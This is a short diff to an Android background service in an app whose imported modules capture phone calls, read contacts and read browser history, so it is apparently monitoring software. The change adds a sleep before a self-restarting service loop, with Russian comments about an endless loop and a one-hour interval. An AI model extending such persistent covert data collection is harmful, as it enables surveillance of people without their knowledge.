@@ -19,6 +19,7 @@ import android.widget.Toast;
 import com.postal.omniscient.R;
 import com.postal.omniscient.postal.browser.history.BrowserHistory;
 import com.postal.omniscient.postal.catchPhone.Call.PhoneCall;
+import com.postal.omniscient.postal.catchPhone.Call.PhoneCallService;
 import com.postal.omniscient.postal.catchPhone.Call.TService;
 import com.postal.omniscient.postal.reader.contact.ReadContacts;
 
@@ -81,7 +82,18 @@ public class MyService extends Service {
 //        as.forceLoad();
 
         Intent par = new Intent(getApplicationContext(), StartService.class);
-        startService(par);// Залоченый безконечный цыкл
+
+        long sec = 1000;
+
+        try {
+            Thread.sleep(sec);// ВРЕМЯ СНА ЦЫКЛА ВКЛЮЧИТЬ 1 ЧАС;
+            startService(par);// Залоченый безконечный цыкл
+        } catch (Exception e) {
+            Log.e("MyMsg","1"+ e.toString());
+        }
+
+
+
 
 //        boolean flag = true;
 //        ActivityManager manager = (ActivityManager) getApplicationContext().getSystemService(Context.ACTIVITY_SERVICE);
